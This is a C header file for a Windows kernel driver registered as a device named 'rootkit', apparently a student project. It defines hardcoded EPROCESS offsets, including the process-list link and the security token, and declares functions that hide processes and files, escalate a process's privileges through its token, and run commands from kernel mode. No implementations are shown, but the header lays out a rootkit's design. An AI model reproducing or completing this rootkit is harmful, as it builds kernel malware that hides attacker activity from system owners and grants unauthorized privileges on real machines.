/*
** File 	driver.h
** Author 	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		Header file - driver stuff
*/

#ifndef		DRIVER_H__
# define	DRIVER_H__

# include	<ntddk.h>

# define 	DEVICE_NAME L"\\Device\\rootkit"
# define 	LINK_NAME   L"\\DosDevices\\rootkit"

# define	SUCCESS_STR	"Success !"
# define	FAILURE_STR	"Failure !"

# define 	EPROCESS_PID_OFFSET 			0x0b4
# define	EPROCESS_FLINK_OFFSET			0x0b8
# define 	EPROCESS_OTABLE_OFFSET			0x0f4
# define	EPROCESS_IMFILENAME_OFFSET		0x16c
# define	EPROCESS_TOKEN_OFFSET			0x0f8
# define	HANDLETABLE_QUOTAPROCESS_OFFSET	0x004

# define	DFLAGS DPFLTR_IHVSTREAMING_ID,DPFLTR_ERROR_LEVEL

typedef unsigned char	BYTE, *PBYTE;

typedef NTSTATUS (*cmdFunc)(char *params);

typedef struct	s_command
{
	char		*name;
	cmdFunc		exec;
}				t_command;

/* driver.c */
NTSTATUS 	DriverEntry(
				IN PDRIVER_OBJECT pDriverObject,
				IN PUNICODE_STRING theRegistryPath);
NTSTATUS	InitDevice(IN PDRIVER_OBJECT pDriverObject);
void		Unload(PDRIVER_OBJECT DriverObject);

/* irp_functions.c */
NTSTATUS	Fonction_IRP_MJ_CREATE(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS	Fonction_IRP_MJ_CLOSE(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS	Fonction_IRP_DEVICE_CONTROL(IN PDEVICE_OBJECT DeviceObject, OUT PIRP Irp);
VOID		InitIRPFunctions(OUT PDRIVER_OBJECT pDriverObject);

/* hide_process.c */
NTSTATUS	HideProcess(IN PCHAR params);

/* hide_file.c */
NTSTATUS	HideFile(IN PCHAR params);

/* root_process.c */
NTSTATUS	RootProcess(IN PCHAR params);

/* exec_command.c */
NTSTATUS	ExecCommand(IN PCHAR cmd);

/* find_eprocess.c */
PEPROCESS	FindEPROCESSByPID(ULONG pidToFind);
PEPROCESS	FindEPROCESSByName(PCHAR toFind);

#endif		/*! DRIVER_H__ */
